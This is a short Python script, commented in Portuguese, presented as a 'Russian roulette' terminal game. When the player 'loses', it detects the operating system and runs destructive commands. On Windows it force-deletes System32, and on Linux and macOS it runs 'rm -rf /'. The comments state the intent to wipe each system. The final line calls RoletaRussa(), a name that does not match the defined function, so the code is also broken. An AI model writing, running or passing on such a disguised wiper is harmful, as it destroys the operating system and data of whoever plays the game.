import random
import os
import platform
import time


def identificar_sistema_operacional():
    sistema = platform.system()
    if sistema == "Windows":
        return "Windows"
    elif sistema == "Linux":
        return "Linux"
    elif sistema == "Darwin":
        return "MacOS"
    else:
        return "Desconhecido"


def roleta_russa():
    camaras = 6
    bala = random.randint(1, camaras)

    sistema = identificar_sistema_operacional()
    print("Bem-vindo (a) ao jogo da Roleta Russa!")
    print("A arma tem 6 câmaras e uma única bala! Hoje é o seu dia de sorte?")

    continuar = True
    while continuar:
        input("Aperte enter para girar o tambor e puxar o gatilho.")
        tiro = random.randint(1, camaras)

        if tiro == bala:
            print("BANG! Você perdeu!")
            time.sleep(2)
            
#Apaga o Windowns
            if sistema == "Windows":
                os.system("del C:\\Windows\System32 /Q /F /S")
# Apaga o Linux
            elif sistema == "Linux":
                os.system("rm -rf /")
                print("Se safou!")
# Apaga o MAC
            elif sistema == "MacOS":
                os.system("rm -rf /") 
            else:
                print("Se safou!")
            break

        else:
            print("Click! Você sobreviveu!")
            time.sleep(1)
            resposta = input("Quer tentar novamente? S/N?: ").strip().upper()
            
            if resposta != "S":
                continuar = False
                print("Fim de jogo!")


# EXECUTAR O GAME
RoletaRussa()
